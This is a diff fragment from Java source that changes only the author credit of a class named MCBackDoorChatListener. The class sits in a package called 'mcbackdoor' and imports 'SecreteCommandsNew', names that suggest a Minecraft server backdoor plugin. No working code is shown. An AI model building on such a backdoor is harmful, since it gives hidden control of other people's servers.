@@ -13,7 +13,7 @@ import org.martin.bukkit.mcbackdoor.scmd.SecreteCommandsNew;
 
 /**
  *
- * @author martin
+ * @author Kekec852
  */
 public class MCBackDoorChatListener extends PlayerListener{
 
